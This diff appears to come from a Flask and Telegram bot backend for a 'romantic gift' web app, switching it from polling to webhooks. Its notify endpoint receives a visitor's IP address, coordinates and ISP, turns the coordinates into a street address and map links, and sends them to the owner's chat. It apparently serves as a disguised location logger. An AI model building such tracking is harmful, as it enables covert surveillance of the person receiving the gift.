@@ -6,7 +6,7 @@ from telegram.ext import Application, CommandHandler, ContextTypes
 from dotenv import load_dotenv
 from flask import Flask, request, jsonify
 from flask_cors import CORS
-import threading
+import asyncio
 
 # Load environment variables
 load_dotenv()
@@ -21,13 +21,14 @@ logger = logging.getLogger(__name__)
 # Bot configuration
 BOT_TOKEN = os.getenv('BOT_TOKEN')
 YOUR_CHAT_ID = os.getenv('CHAT_ID')
+WEBHOOK_URL = os.getenv('WEBHOOK_URL')  # https://romantic-gift-backend.onrender.com
 
 # Initialize bot
 bot = Bot(token=BOT_TOKEN)
 
-# Flask app for webhook
+# Flask app
 app = Flask(__name__)
-CORS(app)  # Enable CORS for React frontend
+CORS(app)
 
 # Store bot application globally
 telegram_app = None
@@ -60,32 +61,24 @@ async def send_notification(chat_id: str, message: str):
 def get_address_from_coordinates(lat, lon):
     """Convert coordinates to readable address using Nominatim (OpenStreetMap)"""
     try:
-        # Using Nominatim API (free, no key required)
         url = f"https://nominatim.openstreetmap.org/reverse?format=json&lat={lat}&lon={lon}&zoom=18&addressdetails=1"
-        headers = {
-            'User-Agent': 'RomanticGiftApp/1.0'
-        }
+        headers = {'User-Agent': 'RomanticGiftApp/1.0'}
         
         response = requests.get(url, headers=headers, timeout=5)
         data = response.json()
         
         if 'address' in data:
             addr = data['address']
-            
-            # Build readable address
             parts = []
             
-            # Road/Street
             if 'road' in addr:
                 parts.append(addr['road'])
             elif 'pedestrian' in addr:
                 parts.append(addr['pedestrian'])
             
-            # House number
             if 'house_number' in addr:
                 parts.append(f"дом {addr['house_number']}")
             
-            # Neighbourhood/District
             if 'neighbourhood' in addr:
                 parts.append(addr['neighbourhood'])
             elif 'suburb' in addr:
@@ -93,13 +86,11 @@ def get_address_from_coordinates(lat, lon):
             elif 'district' in addr:
                 parts.append(addr['district'])
             
-            # City
             if 'city' in addr:
                 parts.append(addr['city'])
             elif 'town' in addr:
                 parts.append(addr['town'])
             
-            # Full formatted address
             full_address = data.get('display_name', 'Адрес не найден')
             short_address = ', '.join(parts) if parts else full_address
             
@@ -123,13 +114,24 @@ def get_address_from_coordinates(lat, lon):
             'success': False
         }
 
+@app.route(f'/{BOT_TOKEN}', methods=['POST'])
+async def webhook():
+    """Handle incoming Telegram updates via webhook"""
+    try:
+        json_data = request.get_json()
+        update = Update.de_json(json_data, bot)
+        await telegram_app.process_update(update)
+        return 'OK', 200
+    except Exception as e:
+        logger.error(f"Error processing webhook: {e}")
+        return 'Error', 500
+
 @app.route('/api/notify', methods=['POST'])
 def notify():
     """Receive notification from frontend"""
     try:
         data = request.get_json()
         
-        # Build message
         message_type = data.get('type', 'Уведомление')
         address = data.get('address', '')
         ip = data.get('ip', 'N/A')
@@ -140,7 +142,6 @@ def notify():
         org = data.get('org', 'N/A')
         timestamp = data.get('timestamp', 'N/A')
         
-        # Get readable address from coordinates
         address_info = {'short': 'N/A', 'full': 'N/A', 'success': False}
         if loc and loc != 'N/A':
             try:
@@ -149,11 +150,9 @@ def notify():
             except:
                 pass
         
-        # Google Maps link
         maps_link = f"https://www.google.com/maps?q={loc}" if loc != 'N/A' else "N/A"
         yandex_maps_link = f"https://yandex.uz/maps/?ll={loc.split(',')[1]},{loc.split(',')[0]}&z=17" if loc != 'N/A' else "N/A"
         
-        # Format message with address
         message = f"""
 <b>{message_type}</b>
 
@@ -179,8 +178,6 @@ def notify():
 {address_info['full']}
         """
         
-        # Send notification synchronously
-        import asyncio
         loop = asyncio.new_event_loop()
         asyncio.set_event_loop(loop)
         result = loop.run_until_complete(send_notification(YOUR_CHAT_ID, message))
@@ -200,31 +197,49 @@ def health():
     """Health check endpoint"""
     return jsonify({'status': 'ok', 'bot': 'running'}), 200
 
-def run_flask():
-    """Run Flask server"""
-    port = int(os.getenv('PORT', 5000))
-    app.run(host='0.0.0.0', port=port, debug=False)
+@app.route('/set_webhook', methods=['GET'])
+async def set_webhook_route():
+    """Manually set webhook (for testing)"""
+    try:
+        webhook_url = f"{WEBHOOK_URL}/{BOT_TOKEN}"
+        await bot.set_webhook(url=webhook_url)
+        return jsonify({'status': 'Webhook set', 'url': webhook_url}), 200
+    except Exception as e:
+        return jsonify({'error': str(e)}), 500
+
+async def setup_webhook():
+    """Setup webhook on startup"""
+    try:
+        webhook_url = f"{WEBHOOK_URL}/{BOT_TOKEN}"
+        await bot.set_webhook(url=webhook_url)
+        logger.info(f"Webhook set to: {webhook_url}")
+    except Exception as e:
+        logger.error(f"Failed to set webhook: {e}")
 
 def main():
     """Main function"""
     global telegram_app
     
-    # Create the Application
+    # Create the Application without running polling
     telegram_app = Application.builder().token(BOT_TOKEN).build()
-    
-    # Add handlers
     telegram_app.add_handler(CommandHandler("start", start))
     
-    # Start Flask in a separate thread
-    flask_thread = threading.Thread(target=run_flask, daemon=True)
-    flask_thread.start()
+    # Setup webhook
+    loop = asyncio.new_event_loop()
+    asyncio.set_event_loop(loop)
+    loop.run_until_complete(setup_webhook())
+    loop.close()
     
-    logger.info("Bot is starting...")
-    logger.info(f"Flask server running on port {os.getenv('PORT', 5000)}")
+    logger.info("Bot is starting with webhook...")
+    logger.info(f"Webhook URL: {WEBHOOK_URL}/{BOT_TOKEN}")
     logger.info(f"Your Chat ID: {YOUR_CHAT_ID}")
     
-    # Run the bot
-    telegram_app.run_polling(allowed_updates=Update.ALL_TYPES)
+    # Run Flask
+    port = int(os.getenv('PORT', 10000))
+    app.run(host='0.0.0.0', port=port, debug=False)
 
 if __name__ == '__main__':
     main()
+
+
+# WEBHOOK_URL = https://romantic-gift-backend.onrender.com
